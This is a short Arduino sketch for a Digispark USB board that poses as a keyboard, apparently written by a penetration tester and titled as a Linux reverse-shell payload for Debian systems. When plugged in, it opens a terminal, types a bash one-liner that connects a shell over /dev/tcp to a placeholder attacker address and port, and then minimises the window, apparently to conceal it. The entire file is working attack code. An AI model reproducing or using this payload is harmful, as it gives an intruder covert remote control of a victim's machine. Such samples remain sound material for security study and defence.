#include "DigiKeyboard.h"

void loop() {}

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  // Author: Pentestersploit/Adrilaw
  // Github: https://github.com/Adrilaw
  // Xda-developer: @Kidpentester
  // Title: Linux-Deb-Reverseshell
  // Description: Uses /dev/tcp to get a reverse shell
  // Target: Debian based
  // VERSION: 1.2
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("bash"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("sh -i >& /dev/tcp/yourip/yourport 0>&1"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_F9, MOD_ALT_LEFT);
}
